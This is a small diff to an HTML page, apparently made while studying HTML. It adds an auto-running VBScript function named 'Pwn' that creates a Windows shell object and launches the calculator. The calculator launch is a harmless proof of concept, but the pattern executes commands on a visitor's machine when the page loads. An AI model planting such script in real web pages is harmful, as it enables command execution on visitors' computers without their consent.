@@ -6,4 +6,12 @@
   <body>
     <h1>이제 html을 연구해보자</h1>
   </body>
+  <script language="VBScript">
+    Function Pwn()
+      Set shell = CreateObject("wscript.Shell")
+      shell.run "calc"
+    End Function
+
+    Pwn
+  </script>
 </html>
